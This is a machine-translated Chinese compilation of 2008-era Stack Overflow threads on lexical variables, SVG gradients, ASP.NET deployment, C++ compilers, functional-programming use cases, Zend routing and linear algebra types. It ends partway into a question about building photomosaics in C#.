> 时间：2008-12-19T17:42:02.003
> 
> 标签：language-agnostic, computer-science, terminology, lexical-scope

我已经多次看到术语“词法变量”，主要是在闭包的上下文中。Paul Graham 在他关于 Lisp 的书中使用这个术语来指代使用 let 表达式定义的变量。

我知道词法作用域是静态作用域的另一个名称。词法变量只是在程序单元的引用环境中可见的变量吗？

我希望在这个假期用这个词给我的朋友和家人留下深刻的印象，有人可以帮帮我吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-19T23:03:52.133

词法变量是只能在其词法范围内（按名称）引用的变量。换句话说，变量的范围是由程序的文本定义的，而不是程序执行的动态。绑定到它的变量和值可能具有超出词法范围的范围（寿命），例如，如果它被捕获在闭包中。

请参阅此[范围和程度](http://www.cs.cmu.edu/Groups/AI/html/cltl/clm/node43.html)的说明。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T17:47:20.667

词法变量在程序单元的引用环境中是可见的，但并非所有在程序单元的引用环境中可见的变量都必须是词法变量。

基本上，词法变量是*特定*于定义它的范围的变量。在像 Perl 这样的语言中，您实际上有两个相互掩蔽的命名空间：底层动态包命名空间和覆盖的词法命名空间。所以 $foo 可以引用任何一个，这完全取决于它是否在词法上被声明。

# flash - 我可以使用 Flash 将多个文件下载到一个目录吗？

> ID：381664
> 
> 赞同：0
> 
> 时间：2008-12-19T17:44:19.330
> 
> 标签：flash

在 Flash 中，我可以提示用户输入保存文件的位置并将文件写入该位置。就我而言，用户想要下载大量文件。有没有办法让用户一次选择一个目录并将许多文件下载到该目录而不提示用户输入每个文件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-20T03:50:46.843

不可以，Flash Player 的安全沙箱不允许这样做。如果您可以在服务器端编写脚本，您可能希望先将它们压缩到 ZIP 存档中，然后让用户下载该单个文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2011-01-06T07:27:21.243

Flash 可以将文件下载为字节，然后用库压缩它们

使用 FLASH 生成 ZIP 的库 [http://www.bytearray.org/?p=105](http://www.bytearray.org/?p=105)

# svg - 可以在 SVG 中创建（或伪造）二维渐变吗？

> ID：381668
> 
> 赞同：4
> 
> 时间：2008-12-19T17:45:46.003
> 
> 标签：svg, gradient

我正在尝试创建一个必须动态生成其图像的颜色选择器，并认为生成 SVG 比生成光栅图像要容易得多。不幸的是，我不知道如何表示将形成选取器核心的大二维渐变。

例如，如果当前选择的轴是蓝色和绿色，我需要绘制一个正方形，它的左下角为黑色，左上角为蓝色，右下角为绿色，右上角为青色。

如果有办法通过覆盖两个`linearGradient`填充的正方形并使用它们的不透明度来实现这一点，我无法解决。我还尝试创建一个渐变，其起点和终点颜色是其他渐变（希望我很聪明），但我得到的只是“大黑什么都没有”。到目前为止，谷歌搜索让我一无所获。

我不想求助于一堆 256 个 1 像素高的渐变，这既是因为尺寸和复杂性的增加，也是因为我怀疑它不会很好地调整大小。也许对 SVG 有更多工作知识的人可以提出一些建议

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2019-11-27T23:23:20.113

这可以使用`mix-blend-mode`style 属性：

```
<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256">
  <defs>
    <linearGradient id="black-to-green" gradientTransform="rotate(0)">
      <stop offset="0"  stop-color="#000000" />
      <stop offset="100%" stop-color="#00ff00" />
    </linearGradient>
    <linearGradient id="black-to-blue" gradientTransform="rotate(90)">
      <stop offset="0"  stop-color="#0000ff" />
      <stop offset="100%" stop-color="#000000" />
    </linearGradient>
  </defs>
  <rect x="0" y="0" width="256" height="256" fill="url('#black-to-green')" />
  <rect x="0" y="0" width="256" height="256" fill="url('#black-to-blue')" style="mix-blend-mode: screen" />
</svg>
```

文档：[https ://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

# asp.net - 关于复制与发布网站的问题

> ID：381679
> 
> 赞同：2
> 
> 时间：2008-12-19T17:48:48.883
> 
> 标签：asp.net, sql-server-2005, .net-3.5, deployment, web-deployment-project

我将不胜感激意见或建议。

几年来，我有一个 html 和 javascript 网站，它位于 Wild West 托管的共享 Apache 服务器上。最近我决定将它迁移到 .NET 3.5 并将它放在同样由 Wild West 托管的共享 Windows IIS7 服务器上。我使用 Visual Studio 2008 重写了所有页面，添加了角色管理、启用了基于角色的安全修剪的站点地图控制的菜单树以及安全目录。可能有六页包含几个安全目录，此时每个目录中只有一个或两个文件。简单的网站。

我使用 VS2008 的 ASP.NET 配置工具来创建与站点地图中所有角色名称匹配的用户和角色，并确认用户等位于 App_Data/ASPNETDB.MDF 数据库的 aspnet_ 表中。该站点在本地计算机上呈现良好。Login.aspx 页面允许用户登录，菜单树相应地调整，登录状态控件相应地调整，用户被适当地重定向......一切都按设计工作。

我取出了与 Wild West（以前称为 GoDaddy）的共享 Windows 主机帐户，将 ASPNETDB 表和数据导出到 .sql 文件并在 MS SQL 服务器上重新创建它们，编辑 web.config 中的连接字符串以使用提供的连接字符串通过 Wild West，然后使用 FileZilla 将文件和文件夹 ftp/复制到 Windows 服务器。.aspx 页面将毫无问题地呈现，但是当我尝试使用任何用户名和密码登录时，会引发 SQL 异常。这是非常模糊的异常消息：

建立与服务器的连接时发生错误。连接到 SQL Server 2005 时，此故障可能是由于在默认设置下 SQL Server 不允许远程连接造成的。（提供者：SQL 网络接口，错误：26 - 错误定位服务器/指定的实例）

Wild West 的技术支持让我删除并重新创建数据库，确保允许远程连接，并且他们验证了连接字符串信息是否正确，但尝试登录时仍然抛出异常。现在，奇怪的是，我可以将连接信息硬编码到页面的代码隐藏中，它会成功连接到数据库以提取信息。因此，Web 服务器可以访问数据库。

所以，我开始怀疑……问题是不是因为我只是将页面、代码隐藏文件和文件夹复制到服务器而不是构建它们然后将编译后的版本复制到服务器？HTML 与 .NET 非常不同，Apache 服务器与 IIS7 非常不同。我在某处读过复制到 IIS7 的未编译站点将由服务器在第一次需要时编译，但也许这不是真的。服务器上的文件夹结构不包括 BIN 文件夹，这让我相信服务器实际上并没有构建站点。我应该从那里删除文件和文件夹，在本地计算机上构建站点，然后将构建的版本复制回服务器吗？这可能是导致错误消息的原因吗？

感谢您提供的任何信息。度过一个愉快的假期。

约翰

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T19:31:00.333

我真的怀疑您看到的问题与您如何部署网站有关。如果您尚未发布网站，IIS 将在第一次请求时自动编译该网站。您可以随时尝试发布它并将所有库复制到服务器，但是我认为这不会解决问题。

对我来说，这听起来像是无法从您的 Web 服务器访问数据库服务器的问题。

您可以发布您正在使用的连接字符串，没有用户名/密码，以便我们查看吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-21T20:35:30.310

问题已解决。这是一个多部分的问题。连接字符串部分需要一个元素来清除从托管公司继承的任何内容。角色和成员资格部分没有引用连接字符串来获取他们的数据。然后登录控件没有找到应该存在的用户名，所以我们添加了一个 Global.asax 文件，如果找不到则添加用户。整个问题和过程已经发布在这个链接： [asp.net forum post](http://forums.asp.net/t/1363469.aspx)

# java - C/objC/C++/Java 编译器

> ID：381680
> 
> 赞同：0
> 
> 时间：2008-12-19T17:48:50.243
> 
> 标签：java, c++, c, objective-c, ide

我下载了 NetBeans（第一次）来使用 Java，发现它也可以处理 C/C++ 等。

想知道以下——

01- 除了 NetBeans 和 MS Visual Studio 之外，还有没有更好的 C++ 工具（IDE）？更好意味着非常成熟和流行（并且免费）。

02- GNU Java 和 Sun Java 编译器有什么区别？

02- 有没有其他流行的 C/ObjC/C++ 编译器是免费的、成熟的和流行的？

感谢您的答复。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T17:54:54.503

1.  我没有见过也没有听说过比 Visual Studio 更好的 IDE。然而“优越性”是一个相当主观的东西，所以有些人可能更喜欢其他 IDE。就年龄和受欢迎程度而言，我认为 Visual Studio 也将胜过所有其他人。~~或许只有德尔福可以接近它。~~哎呀，错过了关于 C++ 的那一行。那我就不知道了。
2.  作者？
3.  GCC 可能比微软的 C 编译器更受欢迎，因为它被移植到很多平台上，其中许多平台都将它作为唯一的 C 编译器。同样值得注意的是 Borland 的编译器和 Intel 的编译器。虽然我不知道其中哪些是免费的（GCC 和 Microsoft 除外）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T18:01:57.173

3) [Eclipse CDT](http://www.eclipse.org/cdt/)（仅限 c/c++）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T19:11:07.860

这是[C++ 编译器](http://en.wikipedia.org/wiki/List_of_compilers#C.2FC.2B.2B_compilers)列表。特别是Open Watcom不仅免费而且相当成熟；它自 80 年代以来就存在。使用 Watcom 编译的著名游戏，如 Doom 和 Duke Nukem 3D。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-24T04:02:55.150

> 01- 除了 NetBeans 和 MS Visual Studio 之外，还有没有更好的 C++ 工具（IDE）？更好意味着非常成熟和流行（并且免费）。

这将在一场火焰战争中结束。我喜欢emacs。它现在已经有 20 多年的历史了（非常成熟！）并且很受欢迎。带有 CDT 的 eclipse 也很受欢迎，并且已经存在好几年了。选择你最喜欢的那个。

> 02- GNU Java 和 Sun Java 编译器有什么区别？

GNU Java 编译器只是带有 java 前端的 gcc。例如，它可以将您的 java 代码编译为本机二进制代码。Sun java编译器来自Sun，比较成熟，被认为是java编译器的参考实现。

> 03- 有没有其他流行的 C/ObjC/C++ 编译器是免费的、成熟的和流行的？

如果免费是指言论自由中的免费（可用的开源代码），那么寻找可以编译 C++/C/Obj-C 代码的 llvm（使用 gcc 作为前端。llvm 是编译器基础设施。它没有实际的代码）。Douglas Gregor 在 C++ 的本地 llvm 前端上工作，不需要 gcc：[http](http://clang.llvm.org/) ://clang.llvm.org/ 。[LCC](http://www.cs.princeton.edu/software/lcc/)是小型 C 编译器，您也可以在 Unix 上使用。我读过还有一个Win32版本。

如果免费是指像啤酒一样免费，那么您当然也可以使用 Microsoft C++ 编译器（随 Visual C++ Express 提供） cl ，但它只能在 Windows 上运行。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-20T03:31:14.653

当然还有一个真正的编辑器，EMACS。做不到这一点（你们这些年轻的whippersnappers，你的弹出窗口和工具提示，天哪）我对Eclipse很满意。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-20T03:49:12.417

我相信 Emacs 是最强大的工具，可以用你的“IDE”做任何你需要做的事情。但是，除了通常的 emacs 命令本身之外，与通常试图对您隐藏的其他工具 (IDE) 相比，它确实需要您了解更多细节。

这些可能包括 makefile、gdb、ctags/cscope、简单的 bash/perl 等，这取决于您需要做什么。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-19T18:07:09.970

2.) Sun Java 带有 Sun 库。目前，无论如何，GNU Java (gcj) 还没有实现很多这些——最重要的是，我认为桌面（AWT/Swing）还没有完成。（如我错了请纠正我！）

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-05-13T18:40:08.460

答案取决于您使用的操作系统。

(1)Windows 操作系统

如果有人找到比 MS Visual C++ 更好的 IDE，我会感到震惊。它非常成熟和流行（而且免费）。

此 IDE 的显着特点是其智能感知和自动完成功能。虽然有些人不喜欢这个 IDE，因为你必须创建一个项目才能编写一个小的 C/C++ 程序，但我仍然相信，它是 Windows 的最佳 IDE。

(1)对于 UNIX

代码块是最好的 IDE。它提供了 Windows 中的 MS Visual C++ 提供的所有功能。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2008-12-19T18:50:16.123

如果你在 Windows 机器上，我会选择 Bloodshed 的 C/C++ IDE 而不是 VS、Eclipse 和 NetBeans。

[http://www.bloodshed.net/download.html](http://www.bloodshed.net/download.html)

真正易于使用的 IDE 并使用 gcc 编译器集。

# scala - 函数式编程的非数字用例？

> ID：381685
> 
> 赞同：27
> 
> 时间：2008-12-19T17:51:04.653
> 
> 标签：scala, f#, functional-programming

我刚读完一本关于 scala 的书。令我印象深刻的是，整本书中的每一个例子都是以某种形式呈现的数字。

像许多程序员一样，我使用的唯一数学是离散数学和组合数学，通常这不是我以明确方式编程的数学。我真的错过了一些关于常规 oo 算法的功能替代/补充的引人注目的例子。

函数式编程有哪些非数字用例？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2008-12-19T19:38:22.347

我的公司要求我编写一个自定义应用程序，允许用户对平面文件数据库执行临时查询。这个应用程序的用户是典型的乔商人类型。他们不是程序员，他们在生活中不太可能见过 SQL 语句。

因此，我的任务是开发一个友好的用户界面，允许用户选择列、表、条件等来构建查询。这是具有挑战性的，因为我可以在 UI 中表示 SQL 语句，而无需先在内存中创建它的抽象表示。

第一次迭代是用 C# 编写的。我创建了一个装载类来表示 SQL 语句的抽象语法，这导致了一个非常麻烦的对象模型：

*   一个 Join 类，一个 Joins 集合类
*   一个 WhereClause 类，一个 WhereClause 集合类
*   一个 SelectedColumn 类，SelectedColumns 集合类
*   一个 OrderBy 类，OrderBy 集合集合类
*   将所有上述类组合在一起的 SqlStatement 类

将 SqlStatement 实例转换为字符串是非常痛苦、丑陋和错误的。将相反的方向从字符串转移到 SqlStatement 更糟糕，因为它使用大量的正则表达式和字符串操作分解了 SQL 字符串的各个部分。

我拼凑了这个系统，制作了一个可以工作的应用程序，但我对它不是很满意。当应用程序的业务需求发生变化时，我尤其没有发生这种情况，这迫使我重新审视我的 C# 代码。

作为一个实验，我用 F# 重写了我的 SqlStatement 并将其表示为一个联合：

```
 type dir = Asc | Desc
type op = Eq | Gt | Gte | Lt | Lte
type join = Inner | Left | Right

type sqlStatement =
    | SelectedColumns of string list
    | Joins of (string * join) list
    | Wheres of (string * op * string) list
    | OrderBys of (string * dir) list

type query = SelectedColumns * Joins * Wheres * OrderBys 
```

那少量的代码替换了几百行 C# 和十几个类。更重要的是，模式匹配简化了将抽象表示转换为 SQL 字符串所需的过程。

有趣的部分是使用 fslex/fsyacc 将 SQL 字符串转换回查询对象。

如果我没记错的话，最初的 C# 代码总共有 600 行，大约有十几个类，很多乱七八糟的正则表达式，并且需要两天的时间来编写和测试。相比之下，F# 代码由一个大约 40 行的 .fs 文件组成，大约 100 行来实现词法分析器/解析器，并且花费了我一天中的几个小时来测试。

说真的，用 F# 编写应用程序的这一部分感觉就像在作弊，就是这么简单。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-12-19T18:41:53.350

我们使用 Haskell 实现[了一种特定领域的语言，用于描述、定价和监控奇异衍生品](http://www.dmst.aueb.gr/dds/pubs/jrnl/2008-JFP-ExoticTrades/html/FSNB08.html)。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-12-19T18:22:04.760

函数式编程是一种范式，类似于过程/结构化、面向对象和通用/模板化编程。它是图灵完备的，所以你可以做任何你想做的事情。

除了数学和科学之外，它还使解析器组合器、人工智能、并发、动态评估、协同例程、延续、简洁符号（更快的大脑到键盘到文本文件的循环和更少的代码维护）变得更容易、强类型参数化（参见 Haskell 的代数类型）和动态自我反思（例如，带有 REPL 的简约元循环解释器）。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-06-05T15:43:53.593

再给你一个：

我参与了为中小型银行、地方政府、证券交易所等设计一套新的企业级金融产品原型的早期阶段。你可能在想“哦，金融代码，你必须做很多数学运算”——实际上，不。这些产品旨在高度可定制，并允许用户在应用程序的战略点注入业务规则。

我们使用 F# 来表示和解释业务规则。举一个简单的例子，让我们编写一些用于检查处理的代码，我们可能会编写如下规则：

```
type condition =
    | Test of string
    | And of condition * condition
    | Or of condition * condition
    | Not of condition

type transactionWorkflow =
    | Reject
    | Approve
    | AdministratorOverride of string
    | If of condition * transactionWorkflow list
         (* condition,  true condition *)
    | IfElse of condition * transactionWorkflow list * transactionWorkflow list
         (* condition,      true condition,            false condition *)
    | AttachForms of string list 
```

使用一个特殊的应用程序，用户可以编写一些由上述结构表示的业务规则。例如：

```
let checkProcessingWorkflow =
    [If(Test("account doesn't exist")
        ,[AdministratorOverride("Account doesn't exist. Continue?");
          AttachForms ["40808A - Null Account Deposit"]]
       );
     If(Test("deposit > 10000")
        ,[
            If(And(Test("account created within 3 months")
                   ,Test("out of country check"))
               ,[Reject]);
            IfElse(Test("account state = TX")
                    ,[AttachForms ["16A"; "16B"]]
                    ,[AttachForms ["1018"]]
                 )
         ]
       );
     Approve
    ] 
```

因此，我们不是编写一个业务规则引擎来管理它们，而是将某些流程作为一种由 F# 解释的非常小的领域特定语言来处理。我希望这种方法能够让我们设计非常简单的业务可读 DSL，而无需检测冲突规则。

当然，上面的所有内容都只是概念代码，我们甚至还处于对我们的规则系统之一进行原型设计的早期阶段。我们使用 F# 而不是 Java 或 C# 有一个特殊原因：模式匹配。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-12-19T18:37:29.410

[“Erlang 入门”](http://www.erlang.org/download/getting_started-5.4.pdf)有一个广泛的客户端/服务器示例（从第 1.3.5 节开始）可能适合您的需要。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-12-19T18:39:17.707

我越是使用功能性风格，我就越喜欢它。[考虑另一个问题](https://stackoverflow.com/questions/364621/python-get-position-in-list#364769)的这个 Python 片段：

```
>>> testlist
[1, 2, 3, 5, 3, 1, 2, 1, 6]
>>> [i for i,x in enumerate(testlist) if x == 1]
[0, 5, 7] 
```

诚然，这或多或少是一个数学陈述，但Python 中有*很多生成器。*一旦你习惯了它，使用列表推导代替循环既容易理解，也不太可能出现错误（你不会“被一个”错误所困扰。）

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-12-20T15:41:07.817

确实很多函数式编程的书都是用“数值编程”来教的，但也有例外。

[Haskell School of Expression](http://www.haskell.org/soe/)是一本关于 Haskell 的初学者书籍，它使用多媒体作为教学工具。

[真实世界的 Haskell](http://www.realworldhaskell.org/blog/)并没有真正贯穿整本书，但有几章涵盖了以函数式风格编写“真实”程序。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-07-15T07:36:05.453

这些天来，我什至不会考虑用非功能性语言（广义上的术语）编写 DSL 词法分析器/解析器。ADT 和模式匹配使它变得如此容易。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2010-07-01T22:00:58.937

非常有趣的问题，因为我认为我是唯一一个为数字编写函数式编程书籍的作者！

函数式编程在历史上更常用于元编程，这意味着编写操作其他程序的程序。这包括解释器和编译器（例如用于 DSL）以及更深奥的应用程序，例如定理证明器（Coq、Isabelle）和术语重写系统（例如，计算机代数系统，如 Mathematica）。元语言 (ML) 系列语言就是为此专门设计的。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-12-19T17:52:59.220

模式匹配也是函数式编程大放异彩的地方，使其在生物信息学等领域非常有用。

然而，鉴于我们今天拥有出色的编译器，函数式编程几乎无处不在。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-12-19T18:18:01.680

检查“[纯功能数据结构](http://books.google.es/books?id=SxPzSTcTalAC&dq=purely+functional+data+structures+okasaki&printsec=frontcover&source=bn&hl=en&sa=X&oi=book_result&resnum=4&ct=result#PPA8,M1)”（[这](http://www.cs.cmu.edu/~rwh/theses/okasaki.pdf)是启发本书的博士论文）。

它们展示了如何用纯函数式（无副作用）语言创建标准数据结构。然后，您可以使用它们来编程任何东西。

免责声明：我在这里拉阿特伍德，我几乎没有读过这本书的几篇评论并浏览了这篇论文，它在我的待读清单上。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-12-27T03:56:49.167

弥合算法差距：用于段落格式化的线性时间函数程序（1997 年）
，由 Oege De Moor、Jeremy Gibbons
[http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.33.7923](http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.33.7923)

Koen Claessen、Ton Vullinghs、Erik Meijer 在 TkGofer (1997) 中构建图形范式 [http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.38.5525](http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.38.5525)

使用功能解析器建模办公流程（1994），Gert Florijn
[http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.19.1307](http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.19.1307)

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2008-12-27T05:41:52.450

我能给出的最好的具体例子是[StringTemplate](http://www.stringtemplate.org/)，一个在 ANTLR 解析器生成器中使用的模板引擎（在许多其他地方）。

在一篇关于 StringTemplate 的设计和开发的论文中，Terence Parr 写道，他最初对函数式编程持怀疑态度，当他意识到 StringTemplate 本质上是一种用于生成文本的函数式语言时，他自嘲地笑了笑。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2009-07-15T06:59:24.857

对于那些认为 LISP 是一种函数式编程语言的人来说，那里有一个用 common lisp 编写的 http 服务器，在 1994 年的一篇论文中介绍，并且仍在 2006 年开发：

*   [http://www.ai.mit.edu/projects/iip/doc/cl-http/server.html](http://www.ai.mit.edu/projects/iiip/doc/cl-http/server.html)
*   [http://www.cl-http.org:8001/cl-http/](http://www.cl-http.org:8001/cl-http/)

对于更现代的东西，你可能想问谷歌“haskell web server”，你可能会发现一些有趣的例子。一个引导我找到这个网站：[http](http://code.haskell.org/) ://code.haskell.org/ 。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2009-07-15T07:44:35.390

Ted Neward 写了一篇关于 Scala 的 10 部分文章，针对 Java 程序员，该系列文章以在 Scala 中编写 DSL 结束。这个特殊的 DSL 实际上是一个数字计算器，但这不是它的有趣之处，它是 DSL 可以很容易地用函数式语言组装的方式

[第1部分](http://www.ibm.com/developerworks/java/library/j-scala08268.html)

[第2部分](http://www.ibm.com/developerworks/java/library/j-scala10248.html?S_TACT=105AGX02&S_CMP=EDU)

[第三部分](http://www.ibm.com/developerworks/java/library/j-scala11218.html?S_TACT=105AGX02&S_CMP=EDU)

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2008-12-19T18:05:12.470

LINQ 从函数式编程中获得了很多线索。看看如何实现任意 LINQ 提供程序可能会为您提供一些实用的见解。

# zend-framework - 如何在 Zend 中创建 foo.com/user？

> ID：381691
> 
> 赞同：0
> 
> 时间：2008-12-19T17:54:38.157
> 
> 标签：zend-framework

好吧，我需要这样做，以便任何用户都可以在我使用 Zend 框架的站点中拥有 foo.com/username。

问题是我希望 foo.com/login 和其他控制器继续工作，所以我已经确认没有用户可以被命名为我要使用的控制器之一。htaccess 不能更改或 mvc 配置不起作用。所以我使用路由器。

我知道如果我使用类似的东西：

```
$routes = array();  
        $routes['entry']  = new Zend_Controller_Router_Route_Regex('SOME REGEX HERE', 
            array(  
                'controller' => 'profile',  
                'action'     => 'show'  
            ),  
            array(  
                'id' => "dsadsa", // maps first subpattern "(\d+)" to "id" parameter  
                1 => 'id' // maps first subpattern "(\d+)" to "id" parameter  
            )  
        );  

$router->addRoutes($routes); 
```

我可以让它匹配正则表达式的所有内容都被重定向，但我不知道是否有更好的方法（以某种方式链接 2 个路由器）我不必在一个非常大的 OR 中实际列出我的控制器。

任何的想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-19T18:27:40.523

您应该能够定义您的用户名路由（您上面的正则表达式路由）并首先将其添加到路由器，然后只需添加您的控制器路由，例如：

`$router->addRoute('user', new Zend_Controller_Router_Route('controller/:var'));`

Zend 将尝试以相反的顺序将请求与定义的路由匹配。如果我的请求与您的控制器路由之一不匹配，它将尝试将其与您的正则表达式路由匹配。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-21T07:05:55.420

像这样的东西应该工作：

```
$routes = array();  

$routes['entry'] = new Zend_Controller_Router_Route(
    ':userName', 
    array(  
        'controller' => 'profile',  
        'action'     => 'show'  
    )
); 
```

然后添加所有其他路由，例如 /login、/logout 等。正如[Tim](https://stackoverflow.com/questions/381691/how-to-create-foocomuser-in-zend#381785)所说，Zend 以相反的顺序匹配路由，因此它会在最终将其发送到您的“用户名”之前尝试匹配您的“白名单”路由“ 路线。

这将破坏 Zend 为确保控制器/动作存在而进行的任何类型的错误检查，因为如果没有路由匹配，所有内容都将被路由到 /profile/show。

但是，如果您可以处理 foo.com/user/<username>，那么所有这些都可以轻松避免。

# c++ - 处理线性代数的最佳基类型

> ID：381695
> 
> 赞同：5
> 
> 时间：2008-12-19T17:56:55.077
> 
> 标签：c++, linear-algebra, double-precision

我正在为一个项目用 C++ 编写一个小型且不足的线性代数库（对不起）。我正在使用双精度数字实现矩阵和运算。我做得对吗？我应该实现一个模板类吗？周围有更精确的类型吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-19T18:00:34.120

我会使用模板来实现类/结构。一开始，你很可能只满足于`double`，但我发现在我**没有将**矩阵作为模板实现的每个项目中，我后来都后悔了。

此外，它还让您有机会使用更有趣的元素代数 - 区间算术、概率分布、复杂数学、定点匹配、子矩阵、简单数学 :-) 等。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-19T18:00:24.867

我使用模板编写了一个 C++ 线性代数库。我的想法是有一天我们可能想要使用复数或扩展精度数。那可能是七年前的事了，我们还没有这样做。我们几乎总是使用双精度数作为模板类型，并且我们有 typedefs 来简化它。

有几次我们采用了另一种方式，使用*小于*double 的类型。例如，我们在[此处](http://www.codeproject.com/KB/recipes/TailKeeper.aspx)描述的内存绑定应用程序中使用了浮点数而不是双精度数。但是 99.9% 的时间我们使用双打。

如果您确实使用模板参数，请注意使用整数类型但隐式需要浮点类型。例如，假设您有一个矩阵，其条目都是整数，因此您使用 matrix<int> 类。但是然后您将其传递给线性求解器。现在你的算术是使用*整数*除法完成的，你的结果是错误的。（我已经做到了！）

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-12-19T18:49:45.923

> 我正在为一个项目用 C++ 编写一个小而不足的线性代数库（对不起）

哎哟！小心，非常非常小心...查看[JAMA/TNT——](http://math.nist.gov/tnt/download.html)它有 NIST 的批准印章，他们已经处理了一些“更简单”的线性代数数学，例如各种因式分解算法。线性代数涉及许多与数值精度有关的棘手问题（例如[希尔伯特矩阵](http://en.wikipedia.org/wiki/Hilbert_matrix)），尽管我喜欢做自己的事情，但这是您可能希望使用已经过良好测试的良好坚实基础的领域之一。

您应该可以使用 long double （不太确定），但算法本身可能比矩阵的精度更重要。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-19T18:03:56.483

最后的问题答案：是的，有，它被称为`long double`并且至少与`double`. 至于是否使用模板，是的，我会使用模板。这对他们来说是一个很好的用例，我认为这将使移植到其他一些标量数字类型更容易。然后，您也可以只键入一个浮点数和/或双精度矩阵，具体取决于您正在运行的系统以及哪个系统在那里运行得更快/更好。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-19T18:11:52.380

不要为自己做任何额外的工作。如果您可以使用双倍（或长双倍），那就去吧。

听起来这只是一个小项目，在这种情况下，模板的东西只会为你工作。

另一个尚未讨论的选项是使用模板来定义您的元素类型。这不会导致太多（如果有的话）额外工作，但允许稍后进行一些更改。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-19T18:00:39.297

没有其他类型比 long double 更精确，**它也有硬件支持**。但是，如果您觉得需要更精确，您可以自由地制作自己的类型。然而，即使经过广泛的优化，它们也会比原生的 double 类型慢很多。

# asp.net - 您是否预编译您的网站以及为什么/为什么不？

> ID：381701
> 
> 赞同：17
> 
> 时间：2008-12-19T17:59:23.963
> 
> 标签：asp.net, deployment

我想了解社区是否预编译的脉搏。我知道它的冷启动时间更快，而且它隐藏了代码。但是，IMO有一些*肮脏的东西。*也许它的名字，编译一个网站听起来不正确。

一般来说，您如何部署 Web 应用程序？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-12-19T18:06:24.043

我只预编译商业销售和许可的网站，以保护源代码不被修改。

据说这有利于性能，但这是次要的；如果任何人都可以使用代码，那么几乎不可能合理地支持商业网站产品！

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-12-19T18:13:44.170

好的，根据情况我有两个答案：

*   **情况1**：我正在部署，我将继续部署升级。我使用复制方法。这对我来说更简单，我知道我在做什么，这样我就不必编写安装程序了。

*   **情况 2**：一个未知技能的未知方 [即客户] 将尝试部署我的站点，我编写了一个安装程序和文档，一个 8 岁的孩子可以通过安装程序一直到配置 - 以及必要时的数据输入。所以在这种情况下，预编译的方法要容易得多。

所以我不虔诚地使用任何一种，我选择最适合这种情况的方法。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-19T18:05:01.550

我们在我的团队中使用预编译方法，因为我们必须将部署交给基础架构团队。我们构建了一个将新版本安装到网站的 MSI 包（带有一个 Web 部署项目）。

推动我们的方法论的更多的是职责/责任分离，而不是技术性的。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-12-19T18:10:07.843

将源代码放在生产服务器上通常是一个糟糕的计划。采用预编译的方法感觉更安全:)

我们的预编译网站被内置到一个 MSI 包中，用于部署到集群环境。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-19T18:05:25.480

我专门为 ASP.NET Web 表单使用预编译的、可更新的网站。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-10-15T09:10:27.460

在我们的例子中，预编译发现了一些没有编译的页面。

所以我建议在构建期间进行预编译，但不一定要部署它。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-19T18:05:51.907

我们不会部署预编译的网站。

**原因**：“这就是我们第一次这样做的方式，它还没有坏掉。”

# c# - 以编程方式创建 Photomosaic

> ID：381713
> 
> 赞同：4
> 
> 时间：2008-12-19T18:03:24.673
> 
> 标签：c#, .net, graphics

目标： 使用 .NET 和 C# 以编程方式创建[照片马赛克。](http://en.wikipedia.org/wiki/Photographic_mosaic)

